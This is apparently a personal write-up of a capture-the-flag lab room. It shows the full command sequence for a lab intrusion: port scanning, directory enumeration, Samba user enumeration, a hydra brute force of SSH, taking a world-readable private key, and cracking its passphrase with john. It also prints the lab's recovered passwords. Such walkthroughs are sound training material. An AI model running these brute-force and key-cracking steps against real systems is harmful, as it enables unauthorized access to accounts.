---
tags: [Rooms]
title: Basic Pentesting
created: '2020-05-15T16:28:05.623Z'
modified: '2020-05-15T23:00:25.720Z'
---

# Basic Pentesting

Nmap scan of the machine:

```
nmap -sV -sC -p- 10.10.157.63 -T4 -v
```

Port 80 is open and contains a web application. The application main page states that it's undergoing maintenance.

Perform directory/file enumeration with gobuster:

```
gobuster dir -u http://10.10.157.63 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -e
```

This reveals a `/development` directory with two **.txt** files. This files reveal that there are two users, one starting with **j** and one with **k**.

The host has Samba enabled (probably a Windows machine) so we can use **enum4linux** to obtain usernames in the machine:

```
enum4linux -a 10.10.157.63
```

The **-a** paramter specifies to perform a simple all enumeration.

We obtain the complete usernames for both users:

```
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```

Since one of the .txt files pointed out that **jan** had a weak password, we can proceed to perform a bruteforce attack on its SSH password with hydra:

```
hydra -l jan -P Documents/Tools/SecLists/Passwords/darkweb2017-top10000.txt 10.10.157.63 ssh
```

This gives us the following password for the user `armando`.

We can now connect via SSH to the machine:

```
ssh jan@10.10.157.63
```

After login with the user **jan**, we can discover that there are 2 home directories (for the 2 users we enumerated previously):

```
drwxr-xr-x 2 root root 4096 Apr 23  2018 jan
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 kay
```

Inside the home directory for **kay** we can find that the directory **.ssh** is readable:

```
drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
```

We can use the id_rsa (private key) to connect to the machine as the **kay** user:

```
ssh -i id_rsa kay@127.0.0.1
```

However, the private key is passsword protected.
Therefore, we need to crack it before being able to use it. First, we copy the contents of the **id_rsa** key to our host, then we convert the key to a valid hash format for john and we finally use **john** to crack it:

```
/usr/share/john/ssh2john.py id_rsa > john_id_rsa.hash
sudo john --wordlist=/home/dent0n/Documents/Tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt john_id_rsa.hash
```

This gives us the following password for the SSH private key `beeswax`.

We can now proceed to login to the machine via SSH with the private key of **kay**:

```
ssh -i id_rsa kay@127.0.0.1
```

Once inside, we can read the contents of the file **pass.bak** which containts the flag.









